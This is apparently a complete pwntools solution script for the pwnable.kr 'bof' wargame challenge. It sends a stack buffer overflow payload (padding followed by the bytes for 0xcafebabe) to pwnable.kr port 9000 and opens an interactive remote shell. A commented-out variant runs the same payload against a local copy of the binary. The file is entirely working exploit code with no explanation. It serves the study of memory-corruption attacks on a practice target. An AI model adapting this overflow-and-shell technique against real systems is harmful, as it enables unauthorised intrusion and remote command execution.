from pwn import *

ip = 'pwnable.kr'
port = 9000
p = '/root/Downloads/bof.local'
sc = '0000111122223333444455556666777788889999aaaabbbbeeee\xbe\xba\xfe\xca'

#sh = process(p)
#sh.send(sc)
#sh.interactive('\nshell# ')

con = remote(ip, port)
con.send(sc)
con.recv(timeout=1)
con.interactive('\nshell# ')
